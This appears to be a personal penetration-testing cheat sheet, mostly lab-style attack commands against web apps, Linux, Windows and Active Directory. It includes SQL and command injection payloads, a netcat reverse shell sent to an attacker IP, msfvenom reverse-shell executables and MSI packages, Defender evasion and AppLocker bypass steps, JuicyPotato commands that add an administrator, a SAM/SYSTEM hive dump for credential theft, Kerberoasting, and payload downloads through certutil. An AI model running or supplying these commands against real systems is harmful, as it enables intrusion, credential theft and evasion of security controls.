# Web Hacking

## SSL Certificates

```shell
# Inspect SSL certificates
openssl s_client -connect 10.10.10.250:443
````

## OWASP Top 10

## SQL Injection

### PostgreSQL Injection

```command
'; select pg_sleep(10);-- -
```

## Microsoft IIS

You may be available to to load external server resources abusing XP_DirTree

```bash
# Share a resource with Impackets
impacket-smbserver smbFolder $(pwd) -smb2support

# Injection to the URL
id=1;EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\smbFolder\test'

# Crack the NTLMv2 Hash from the user
john -w:rockyou.txt hash
```

## Command Injection

### Ask Jeeves

```powershell
# Shared resource
println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
```
------------------------------------------------------------------------------------------------------
# Linux Section

## Enumeration

```shell
# System Enumeration
find / -name file 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```
------------------------------------------------------------------------------------------------------
# Windows Section

## Active Directory Enumeration

### SMBClient

```shell
smbclient -L 10.10.10.250 -N
```

### SMBMap

```shell
# Unauthenticated
smbmap -H 10.10.10.250 -u 'null'

# Authenticated to a share 
smbmap -H 10.10.10.250 -u
```

### RPCClient

```powershell
# Unauthenticated (Null Session)
rpcclient -U "" 10.10.10.250

# Authenticated
rpcclient -U "username%password" 10.10.10.250
enumdomusers
enumdomgroups
querygroupmem <rid>
queryuser <rid>
```

# Kerberos

## Enumerating valid users

#### [kerbrute](https://github.com/ropnop/kerbrute)

Find **valid** domain controller users

```powershell
kerbrute userenum --dc 10.10.10.250 -d domain.local users.list
```

Combinating with [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)

Find **ASREPRoast** users. Requires with **UF_DONT_REQUIRE_PREAUTH** attribute.

```powershell
GetNPUsers.py domain.local/ --no-pass -usersfile valid_users.list
```

Find **Kerberoasting** users. Requires users with **ServicePrincipalName** attribute.

Combinating with [GetUsersSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

```powershell
GetUsersSPNs.py 'domain.local/jan:password'
```

# Windows Privilege Escalation Techniques

## Windows Internal Enumeration

```powershell
# System Enumeration / Access Denied
systeminfo / [Environment]::Is64BitOperatingSystem, [Environment]::Is64BitProcess (PowerShell Sysnative Migration if false)
windows version registry key print
.\winPease.exe

# Network Enumeration
netstat -nat

# User Enumeration
whoami /priv, whoami /all
net user <user>

# Group Enumeration
net group

# Services Enumeration
services
cmd /c sc query
cmd /c sc stop <service>
Get-WmiObject win32_service
cd HKLM:SYSTEM\CurrentControlSet\Services
Stop-Service -Name <ServiceName> -Force


# Files Enumeration
icacls file.txt
dir /s /r file.txt
```

## Evading Defender

### Phantom Evasion

Using [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion)

Windows Module > Windows Shellcode Injection > Enter > x64 > msfvenom > Yes > windows/x64/shell_reverse_tcp > 10.10.10.10 > 443 > Enter > Double-key Xor > Enter > Heap_RWX > Enter till output format > payload.exe 

### MSFVenom

Try RC4 

```shell
msfvenom --encrypt rc4 --encrypt-key supersecretkey -f c
```

### Obfuscating payloads with Ebowla

Clone [Ebowla](https://github.com/Genetic-Malware/Ebowla)

List Machine Enviorment Variables

```powershell
hostname
```

Modify genetic.config

```shell
output_type = GO
payload_type = EXE

# Fill the available entries
[[ENV_VAR]]
computerName = 'Janrdz'
```

Use Python, the final payload will be at the output directory

```shell
python ebowla.py payload.exe genetic.config

# Compiling the payload (in this case x64)
./build_x64_go.sh payload finalPayload.exe
```

### Evil-WinRM

```Shell
menu
```

### Mingw-w64

Install mingw-64

```shell
sudo apt install mingw-w64
```

Create a .c file

```shell
nvim test.c
```

Execute a command at system level

```c
# include <stdlib.h>

int main() {
        system("");
}
```

Compile

```shell
x86_64-w64-mingw32-gcc test.c -o payload.exe
```

### Program blocked by group policy

If a program is blocked by a group policy 

Use [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) and try \drivers\color

Copy the payload. If it works after that, run where desired for NT Authority/System 

```powershell
cp payload.exe C:\Windows\System32\spool\drivers\color\payload.exe
```

## Enumerating Firewall

```powershell
# Display rules that are off and that blocks outbound traffic
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True

# Display rules that allow outbound traffic
Get-NetFirewallRule -Direction Outbound -Action Allow -Enabled True
```

## Abusing groups

### Server Operators
Create/Modify Services

```powershell
# MSFVenom Reverse Shell (Specify x32/x64 bits)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > rev.exe

# Modiying binary
sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
```
## Abusing Privileges

### SeImpersonatePrivilege
#### [JuicyPotato](https://github.com/k4sth4/Juicy-Potato)

```powershell
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
```

### AlwaysInstallElevated

Create a payload.msi with MSFVenom (Reverse Shell)

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```

### SeBackupPrivilege

Create a copy of SYSTEM and SAM dump with [secretsdump.py](https://github.com/fin3ss3g0d/secretsdump.py)

```powershell
PS C:\Temp> reg save HKLM\system system
PS C:\Temp> reg save HKLM\sam sam
```

------------------------------------------------------------------------------------------------------

# File Transfers

## Windows

```powershell
certutil.exe -f -urlcache -split http://10.10.10.10/winPease.exe winPease.exe
```

## Impackets

```command
impacket-smbserver smbFolder $(pwd) -smb2support
```

------------------------------------------------------------------------------------------------------

# Port Fordwarding

## Chisel

A port may be unaccessible from outside, but accessible from the internal network. With Chisel we can perform
remote port forwarding to be able to access that port from outside.

```powershell
# From the attacker machine
./chisel server -p 1234 --reverse

# Applying remote port fordwarding  
.\chisel.exe client 10.10.10.10:1234 R:9512:127.0.0.1:9512

# Check the port
lsof -i:9512
```
 
------------------------------------------------------------------------------------------------------

# Extra

## Alternate Data Streams (Windows)

ADS (Alternate Data Stream): is the ability to branch data into existing files without changing or altering its functionality, size or display to file browsing utilities.

```command
dir /r /s
more < ads.txt
more < ads.txt:file.txt
```

## Change access control lists on files and folders

```powershell
icacls file.txt
```

## Separating characters with points

```shell
echo "characters" | iconv -t utf-16le | base64 -w 0; echo
```

# Compilating Lightweight Binaries in Go

```bash
go build -ldflags "-s -w" .
du -hc file
upx file
```
